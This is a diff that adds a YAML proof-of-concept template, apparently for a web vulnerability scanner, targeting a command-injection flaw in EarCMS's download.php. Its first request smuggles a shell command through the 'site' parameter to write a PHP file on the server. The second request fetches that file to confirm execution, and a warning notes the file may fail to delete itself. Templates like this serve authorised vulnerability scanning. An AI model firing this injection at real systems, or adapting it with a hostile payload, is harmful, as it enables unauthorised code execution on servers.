@@ -1,0 +1,31 @@
+name: poc-yaml-earcms-download-php-exec
+binding: c65f77bc-eeb1-464a-b2fb-7e5098be6dd3
+manual: true
+detail:
+    author: sharecast
+    links:
+        - https://zhuanlan.zhihu.com/p/81934322
+    vulnerability:
+        id: CT-416446
+        level: critical
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{randname}}.php%3B
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /source/pack/127.0.0.1/{{randname}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
